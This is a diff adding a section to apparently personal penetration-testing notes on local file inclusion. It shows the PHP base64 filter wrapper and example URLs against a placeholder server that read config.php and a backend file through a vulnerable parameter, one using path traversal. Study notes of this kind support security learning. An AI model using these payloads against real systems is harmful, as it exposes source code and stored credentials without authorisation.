@@ -64,3 +64,16 @@ Using PHP Filters:
 
 Sometimes we may want to extract other files or disclose source codes, but due to nature of webpage rendering, sometimes we can't just include that file and view it, as it would not render anything on the webpage (For example: a php config file), if that's the case, we can use PHP filters to convert the files into base64 encoding, so that it can properly display on our end.
 
+Below is the filter to use and some example:
+```
+php://filter/read=convert.base64-encode/resource= #filter to use
+```
+
+Example:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
+
+http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../backend/localveri.php
+```
+
+Using PHP Wrappers:
